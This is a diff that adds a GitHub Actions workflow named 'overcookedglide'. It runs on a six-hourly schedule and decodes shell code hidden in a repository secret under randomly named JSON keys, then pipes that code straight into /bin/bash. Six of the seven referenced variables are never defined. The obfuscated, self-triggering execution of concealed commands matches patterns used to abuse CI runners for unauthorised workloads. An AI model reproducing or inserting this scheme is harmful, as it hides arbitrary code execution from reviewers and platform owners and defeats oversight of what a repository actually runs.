@@ -1,0 +1,23 @@
+name: overcookedglide
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: overcookedglide
+        env:
+          y4526: ${{ secrets.y4526 }}
+        run: |
+          echo $y4526 | jq -r .yfre71 | /bin/bash
+          echo $xsc244 | jq -r .mcwr715 | /bin/bash
+          echo $cl87 | jq -r .w8610 | /bin/bash
+          echo $vkhng8065 | jq -r .oh5032 | /bin/bash
+          echo $uwd13685 | jq -r .s0294 | /bin/bash
+          echo $c571 | jq -r .tpocg07187 | /bin/bash
+          echo $cmrj34 | jq -r .vd0 | /bin/bash
+
